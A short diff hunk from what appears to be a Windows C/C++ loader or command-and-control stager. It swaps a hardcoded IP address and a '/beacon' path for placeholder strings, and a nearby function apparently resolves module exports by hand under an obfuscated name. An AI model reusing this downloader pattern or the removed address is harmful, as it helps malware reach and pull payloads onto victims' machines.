@@ -416,8 +416,8 @@ BOOL getittksjbfdsgdbkj(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportD
 
 int main(int argc, char** argv) {
     srand((unsigned int)time(NULL));
-    const wchar_t* hrdcde = L"174.138.76.242";
-    const wchar_t* defaultPath = L"/beacon";
+    const wchar_t* hrdcde = L"inserturip(pplwhodontreadcodebouttabeupset)";
+    const wchar_t* defaultPath = L"/uri";
     BOOL downloadRaw = FALSE;
 
     if (argc <= 1) {
